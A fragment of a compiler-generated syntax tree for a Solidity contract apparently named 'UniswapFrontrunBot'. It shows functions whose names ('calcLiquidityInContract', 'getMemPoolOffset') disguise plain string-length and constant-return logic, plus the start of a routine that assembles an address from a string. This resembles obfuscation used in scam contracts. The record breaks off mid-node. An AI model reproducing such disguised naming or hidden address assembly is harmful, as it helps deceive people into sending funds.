																			"referencedDeclaration": 665,
																			"src": "8115:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30784630",
																			"id": 685,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "8119:4:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_240_by_1",
																				"typeString": "int_const 240"
																			},
																			"value": "0xF0"
																		},
																		"src": "8115:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": {
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 694,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 692,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 665,
																				"src": "8177:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30784638",
																				"id": 693,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8181:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_248_by_1",
																					"typeString": "int_const 248"
																				},
																				"value": "0xF8"
																			},
																			"src": "8177:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": {
																			"condition": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 702,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 700,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 665,
																					"src": "8239:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30784643",
																					"id": 701,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8243:4:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_252_by_1",
																						"typeString": "int_const 252"
																					},
																					"value": "0xFC"
																				},
																				"src": "8239:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			},
																			"falseBody": {
																				"id": 712,
																				"nodeType": "Block",
																				"src": "8298:43:0",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 710,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 708,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 641,
																								"src": "8317:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "36",
																								"id": 709,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8324:1:0",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_6_by_1",
																									"typeString": "int_const 6"
																								},
																								"value": "6"
																							},
																							"src": "8317:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 711,
																						"nodeType": "ExpressionStatement",
																						"src": "8317:8:0"
																					}
																				]
																			},
																			"id": 713,
																			"nodeType": "IfStatement",
																			"src": "8236:105:0",
																			"trueBody": {
																				"id": 707,
																				"nodeType": "Block",
																				"src": "8249:43:0",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 705,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 703,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 641,
																								"src": "8268:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "35",
																								"id": 704,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8275:1:0",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_5_by_1",
																									"typeString": "int_const 5"
																								},
																								"value": "5"
																							},
																							"src": "8268:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 706,
																						"nodeType": "ExpressionStatement",
																						"src": "8268:8:0"
																					}
																				]
																			}
																		},
																		"id": 714,
																		"nodeType": "IfStatement",
																		"src": "8174:167:0",
																		"trueBody": {
																			"id": 699,
																			"nodeType": "Block",
																			"src": "8187:43:0",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 697,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 695,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 641,
																							"src": "8206:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "34",
																							"id": 696,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8213:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_4_by_1",
																								"typeString": "int_const 4"
																							},
																							"value": "4"
																						},
																						"src": "8206:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 698,
																					"nodeType": "ExpressionStatement",
																					"src": "8206:8:0"
																				}
																			]
																		}
																	},
																	"id": 715,
																	"nodeType": "IfStatement",
																	"src": "8112:229:0",
																	"trueBody": {
																		"id": 691,
																		"nodeType": "Block",
																		"src": "8125:43:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 689,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 687,
																						"name": "ptr",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 641,
																						"src": "8144:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "+=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "33",
																						"id": 688,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8151:1:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_3_by_1",
																							"typeString": "int_const 3"
																						},
																						"value": "3"
																					},
																					"src": "8144:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 690,
																				"nodeType": "ExpressionStatement",
																				"src": "8144:8:0"
																			}
																		]
																	}
																},
																"id": 716,
																"nodeType": "IfStatement",
																"src": "8050:291:0",
																"trueBody": {
																	"id": 683,
																	"nodeType": "Block",
																	"src": "8063:43:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 681,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 679,
																					"name": "ptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 641,
																					"src": "8082:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "+=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 680,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8089:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "8082:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 682,
																			"nodeType": "ExpressionStatement",
																			"src": "8082:8:0"
																		}
																	]
																}
															},
															"id": 717,
															"nodeType": "IfStatement",
															"src": "7987:354:0",
															"trueBody": {
																"id": 675,
																"nodeType": "Block",
																"src": "8001:43:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 673,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 671,
																				"name": "ptr",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 641,
																				"src": "8020:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "+=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 672,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8027:1:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"src": "8020:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 674,
																		"nodeType": "ExpressionStatement",
																		"src": "8020:8:0"
																	}
																]
															}
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 660,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 658,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 641,
														"src": "7881:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 659,
														"name": "end",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 648,
														"src": "7887:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7881:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 719,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 656,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 654,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 638,
															"src": "7874:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 655,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7878:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "7874:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 657,
													"nodeType": "ExpressionStatement",
													"src": "7874:5:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 662,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7892:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 661,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 638,
															"src": "7892:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 663,
													"nodeType": "ExpressionStatement",
													"src": "7892:3:0"
												},
												"nodeType": "ForStatement",
												"src": "7869:483:0"
											}
										]
									},
									"documentation": null,
									"id": 721,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "calcLiquidityInContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 636,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 635,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 721,
												"src": "7735:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 634,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "7735:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7734:19:0"
									},
									"returnParameters": {
										"id": 639,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 638,
												"mutability": "mutable",
												"name": "l",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 721,
												"src": "7777:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 637,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7777:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7776:8:0"
									},
									"scope": 1680,
									"src": "7702:657:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 728,
										"nodeType": "Block",
										"src": "8425:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "323930323731",
													"id": 726,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8443:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_290271_by_1",
														"typeString": "int_const 290271"
													},
													"value": "290271"
												},
												"functionReturnParameters": 725,
												"id": 727,
												"nodeType": "Return",
												"src": "8436:13:0"
											}
										]
									},
									"documentation": null,
									"id": 729,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 722,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8393:2:0"
									},
									"returnParameters": {
										"id": 725,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 724,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 729,
												"src": "8419:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 723,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8419:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8418:6:0"
									},
									"scope": 1680,
									"src": "8368:89:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 904,
										"nodeType": "Block",
										"src": "8716:857:0",
										"statements": [
											{
												"assignments": [
													737
												],
												"declarations": [
													{
														"constant": false,
														"id": 737,
														"mutability": "mutable",
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "8727:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 736,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8727:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 742,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 740,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 731,
															"src": "8752:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 739,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "8746:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 738,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8746:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 741,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8746:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8727:28:0"
											},
											{
												"assignments": [
													744
												],
												"declarations": [
													{
														"constant": false,
														"id": 744,
														"mutability": "mutable",
														"name": "iaddr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "8766:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 743,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8766:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 746,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 745,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8782:1:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8766:17:0"
											},
											{
												"assignments": [
													748
												],
												"declarations": [
													{
														"constant": false,
														"id": 748,
														"mutability": "mutable",
														"name": "b1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "8794:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 747,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8794:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 749,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8794:10:0"
											},
											{
												"assignments": [
													751
												],
												"declarations": [
													{
														"constant": false,
														"id": 751,
														"mutability": "mutable",
														"name": "b2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "8815:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 750,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8815:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 752,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8815:10:0"
											},
											{
												"body": {
													"id": 897,
													"nodeType": "Block",
													"src": "8877:657:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 770,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 768,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 744,
																	"src": "8892:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 769,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8901:3:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "8892:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 771,
															"nodeType": "ExpressionStatement",
															"src": "8892:12:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 782,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 772,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 748,
																	"src": "8919:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 777,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 737,
																						"src": "8938:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 779,
																					"indexExpression": {
																						"argumentTypes": null,
																						"id": 778,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 754,
																						"src": "8942:1:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8938:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 776,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8932:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 775,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8932:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 780,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8932:13:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 774,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8924:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 773,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8924:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 781,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8924:22:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8919:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 783,
															"nodeType": "ExpressionStatement",
															"src": "8919:27:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 796,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 784,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 751,
																	"src": "8961:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 789,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 737,
																						"src": "8980:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 793,
																					"indexExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 792,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 790,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 754,
																							"src": "8984:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 791,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8988:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "8984:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8980:10:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
